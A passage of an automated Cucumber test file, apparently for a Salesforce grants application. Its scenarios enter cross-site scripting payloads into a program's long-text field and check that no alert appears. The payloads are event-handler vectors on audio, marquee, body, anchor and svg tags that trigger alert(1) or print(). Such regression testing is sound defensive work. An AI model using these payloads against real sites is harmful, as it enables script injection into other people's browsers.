      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303101 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                        | Field                          |
      | <audio src/onerror=alert(1)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303103 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                          |
      | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303104 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                    | Field                          |
      | <a id=x tabindex=1 onfocus=alert(1)></a> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303106 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                      | Field                          |
      | <a id=x tabindex=1 onfocusin=alert(1)></a> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303108 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                         | Field                          |
      | <body onhashchange="print()"> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303109 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                  | Field                          |
      | <body onload=alert(1)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303110 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                  | Field                          |
      | <body onload=alert(1)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303111 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                             | Field                          |
      | <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303112 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                    | Field                          |
      | <body onmessage=print()> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303113 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                    | Field                          |
      | <body onmessage=print()> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303115 @Vrushali
  Scenario Outline:XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                  | Field                          |
      | <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303116 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                     | Field                          |
      | <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303118 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                     | Field                          |
      | <body onpopstate=print()> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303120 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                   | Field                          |
      | <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303940 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                   | Field                          |
      | <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303942 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                     | Field                          |
      | <body onresize="print()"> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303943 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                   | Field                          |
      | <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303944 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
